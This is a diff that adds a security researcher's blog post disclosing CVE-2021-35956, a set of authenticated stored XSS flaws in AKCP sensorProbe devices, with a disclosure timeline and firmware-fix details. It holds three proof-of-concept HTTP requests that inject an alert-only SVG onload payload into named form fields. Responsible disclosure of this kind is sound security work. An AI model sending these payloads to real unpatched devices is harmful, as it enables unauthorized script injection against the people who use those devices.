@@ -1,0 +1,196 @@
+I"�8<p>This week, I was incredibly fortunate to finally get my first CVE vulnerability assigned by Mitre 🎉 ! <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-35956" class="highlighted">CVE-2021-35956</a> details multiple stored cross-site scripting (XSS) vulnerabilities I discovered in the AKCP sensorProbe embedded webserver. In this post, I’ll describe the technical details of the vulnerability, the vendor’s response, and remediation options. Overall AKCP was an exceptional partner in the responsible disclosure process, remediating the issue quickly and providing me with a test unit to verify the updated firmware.</p>
+
+<h4 id="index"><strong>Index</strong></h4>
+<ul>
+  <li><a href="/blog/2021/06/CVE-2021-35956#-disclosure-timeline">Disclosure Timeline</a></li>
+  <li><a href="/blog/2021/06/CVE-2021-35956#-about-the-vendor">About the Vendor</a></li>
+  <li><a href="/blog/2021/06/CVE-2021-35956#-cve-2021-35956-vulnerability-details">Vulnerability Details</a></li>
+  <li><a href="/blog/2021/06/CVE-2021-35956#-firmware-upgrade">Firmware Upgrade</a></li>
+</ul>
+
+<h4 id="-disclosure-timeline"><strong>⏱ Disclosure Timeline</strong></h4>
+
+<div class="timeline mt-1 mb-1">
+      <div class="tl-item active">
+          <div class="tl-dot b-warning"></div>
+          <div class="tl-content">
+              <div class="">I attempt to find a security contact at AKCP, could not do so, and contacted the sales team at sales@akcp.com</div>
+              <div class="tl-date text-muted mt-1">29 May 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-warning"></div>
+          <div class="tl-content">
+              <div class="">I recieve response from management, and release my responsible disclosure report</div>
+              <div class="tl-date text-muted mt-1">29 May 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-primary"></div>
+          <div class="tl-content">
+              <div class="">AKCP provides me a copy of beta test firmware for the fix</div>
+              <div class="tl-date text-muted mt-1">15 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-primary"></div>
+          <div class="tl-content">
+              <div class="">AKCP provides me an ip address for a test unit to verify the fix, I confirm the vulnerability has been fixed</div>
+              <div class="tl-date text-muted mt-1">16 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-primary"></div>
+          <div class="tl-content">
+              <div class="">AKCP releases updated <a href="http://www.akcp.in.th/downloads/Firmwares/SP480-20210624.zip" class="highlighted">firmware</a> on their website and updates their <a href="https://www.akcp.com/support-center/customer-login/sensor-probe-firmware-changelog/" class="highlighted">changelog</a> mentioning the XSS vulnerability</div>
+              <div class="tl-date text-muted mt-1">25 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-danger"></div>
+          <div class="tl-content">
+              <div class="">I submit a request for CVE through Mitre's <a href="https://cveform.mitre.org/" class="highlighted">submission form</a></div>
+              <div class="tl-date text-muted mt-1">28 June 2021</div>
+          </div>
+      </div>
+      <div class="tl-item">
+          <div class="tl-dot b-danger"></div>
+          <div class="tl-content">
+              <div class="">Mitre reserves CVE-2021-35956 for the vulnerability </div>
+              <div class="tl-date text-muted mt-1">29 June 2021</div>
+          </div>
+      </div>
+    </div>
+
+<h4 id="-about-the-vendor"><strong>💡 About the Vendor</strong></h4>
+
+<p><a href="https://www.akcp.com" class="highlighted">AKCP</a> is a sensor manufacturer developing network-based temperature, enviorment, and power monitoring devices. Their clients include big names like Nasa, Coca-cola, Toyota, Adobe, and much <a href="https://www.akcp.com/about-akcp-2/" class="highlighted">more</a>. Their most popular devices include the sensorProbe, securityProbe, and AKCPro Server. This research identifies multiple stored cross-site scripting vulnerabilities in all sensorProbe devices. According to <a href="https://www.akcp.com/akcp-products/sensorprobe-series/" class="highlighted">AKCP</a>, the sensorProbe devices are,</p>
+
+<p><em>“the worlds <strong>most installed</strong> Remote Environmental Sensor Monitoring Device … deployed in a wide variety of industries including Data Center Environmental Monitoring, Warehouse Temperature Monitoring, Cold Storage Temperature Monitoring, Fuel / Generator Monitoring, and other Remote Site Monitoring applications.”</em></p>
+
+<h4 id="-cve-2021-35956-vulnerability-details"><strong>🆘 CVE-2021-35956 Vulnerability Details</strong></h4>
+
+<p>All sensorProbe devices prior to firmware version SP480-20210624 are vulnerable to authenticated stored cross-site scripting via the Sensor Description, Email, and System setting fields. Authenticated users can introduce arbitrary javascript through the vulnerable fields, and have payloads execute in the context of users who visit the sensorProbe embedded webserver dashboard. While stored XSS can be dangerous, this vulnerability requires the attacker to already be authenticated in order to store payloads.</p>
+
+<p><em>The following section identifies proof of concepts for each vulnerable field</em></p>
+
+<h4 id="stored-cross-site-scripting-via-system-settings">Stored Cross-Site Scripting via System Settings</h4>
+
+<p>The sensorProbe embedded web server is vulnerable to authenticated stored cross-site scripting via the system name and system location parameters in system settings.</p>
+
+<p><strong>Payload</strong>: <code class="language-plaintext highlighter-rouge">&lt;svg/onload=alert`xss`&gt;</code></p>
+
+<p><strong>Proof of Concept</strong></p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">POST /system?time=32e004c941f912 HTTP/1.1</span>
+<span class="na">Host</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">target</span><span class="pi">]</span>
+<span class="na">Content-Length</span><span class="pi">:</span> <span class="m">114</span>
+<span class="na">Cache-Control</span><span class="pi">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="pi">:</span> <span class="m">1</span>
+<span class="na">Origin</span><span class="pi">:</span> <span class="s">http://[target]</span>
+<span class="na">Content-Type</span><span class="pi">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="pi">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span>
+<span class="na">Accept</span><span class="pi">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="pi">:</span> <span class="s">http://[target]/system?time=32e004c941f912</span>
+<span class="na">Accept-Encoding</span><span class="pi">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="pi">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Connection</span><span class="pi">:</span> <span class="s">close</span>
+
+<span class="s">_SA01=System+Namer&amp;_SA02=RDC&amp;_SA03=Name&lt;svg/onload=alert`xss`&gt;&amp;_SA04=1&amp;_SA06=0&amp;_SA36=0&amp;_SA37=0&amp;sbt1=Save</span>
+</code></pre></div></div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss_0.png" />
+    </div>
+</div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss-1.png" />
+    </div>
+</div>
+
+<h4 id="2-stored-cross-site-scripting-via-email-settings">2) Stored Cross-Site Scripting via Email Settings</h4>
+
+<p>The sensorProbe embedded web server is vulnerable to authenticated stored cross-site scripting via the mail from, mail to, and mail cc  parameters in email settings.</p>
+
+<p><strong>Payload</strong>: <code class="language-plaintext highlighter-rouge">&lt;svg/onload=alert`xss`&gt;</code></p>
+
+<p><strong>Proof of Concept</strong></p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">POST /mail?time=32e004c941f912 HTTP/1.1</span>
+<span class="na">Host</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">target</span><span class="pi">]</span>
+<span class="na">Content-Length</span><span class="pi">:</span> <span class="m">162</span>
+<span class="na">Cache-Control</span><span class="pi">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="pi">:</span> <span class="m">1</span>
+<span class="na">Origin</span><span class="pi">:</span> <span class="s">http://[target]</span>
+<span class="na">Content-Type</span><span class="pi">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="pi">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span>
+<span class="na">Accept</span><span class="pi">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="pi">:</span> <span class="s">http://[target]/mail?time=32e004c941f912</span>
+<span class="na">Accept-Encoding</span><span class="pi">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="pi">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Connection</span><span class="pi">:</span> <span class="s">close</span>
+
+
+<span class="s">_PS03=test@test.com&amp;_PS04=test@test.com&amp;_PS05_0=test@test.com&amp;_PS05_1=test@test.comr&amp;_PS05_3=&lt;svg/onload=alert`xxss`&gt;&amp;_PS05_4=&amp;sbt2=Save</span>
+</code></pre></div></div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss_2x.png" />
+    </div>
+</div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/xss_3.png" />
+    </div>
+</div>
+
+<h4 id="3-stored-cross-site-scripting-via-sensor-description">3) Stored Cross-Site Scripting via Sensor Description</h4>
+
+<p>The sensorProbe embedded web server is vulnerable to authenticated stored cross-site scripting via sensor settings description parameter for each of the sensor options.</p>
+
+<p><strong>Payload</strong>: <code class="language-plaintext highlighter-rouge">&lt;svg/onload=alert`xss`&gt;</code></p>
+
+<p><strong>Proof of Concept</strong></p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">POST /senswatr?index=0&amp;time=32e004c941f912 HTTP/1.1</span>
+<span class="na">Host</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">target</span><span class="pi">]</span>
+<span class="na">Content-Length</span><span class="pi">:</span> <span class="m">55</span>
+<span class="na">Cache-Control</span><span class="pi">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="pi">:</span> <span class="m">1</span>
+<span class="na">Origin</span><span class="pi">:</span> <span class="s">http://[target]</span>
+<span class="na">Content-Type</span><span class="pi">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="pi">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span>
+<span class="na">Accept</span><span class="pi">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="pi">:</span> <span class="s">http://[target]/senswatr?index=0&amp;time=32e004c941f912</span>
+<span class="na">Accept-Encoding</span><span class="pi">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="pi">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Cookie</span><span class="pi">:</span> <span class="s">CPCookie=sensors=400</span>
+<span class="na">Connection</span><span class="pi">:</span> <span class="s">close</span>
+
+<span class="s">_WT00-IX="&gt;&lt;svg/onload=alert`xss`&gt;&amp;_WT03-IX=2&amp;sbt1=Save</span>
+</code></pre></div></div>
+
+<h4 id="-firmware-upgrade"><strong>🚀 Firmware Upgrade</strong></h4>
+
+<p>As of Friday June 25th, SensorProbe users can upgrade their devices to SP480-20210624 according to AKCP standards outlined in the <a href="https://www.akcp.com/support-center/customer-login/sensorprobe-series-firmware-download/" class="highlighted">firmware download</a> page.</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Firmware Update – Download – release date 28 June 2021
+Latest Firmware – SP480-20210624
+Note: To download files, right-click on the file and select “save as”
+md5sum: 83f107f274ed6fda2cd5aa0f21935a98
+
+IMPORTANT NOTE: The sensorProbe2 &amp; SP8 units with the Atmega128 micro-controller (SPxxxi) do not support this firmware version. You can check your units micro-controller version in the web interface System page &gt;&gt; System Description. If you see an “I” after the firmware version (SPxxxi) then your unit is using the older Atmega128 micro-controller. Please see below for the latest firmware for your SP8 base unit.
+</code></pre></div></div>
+
+<div class="row mt-3">
+    <div class="center">
+        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-06-28-CVE-2021-35956/changelog.png" />
+    </div>
+</div>
+
+:ET
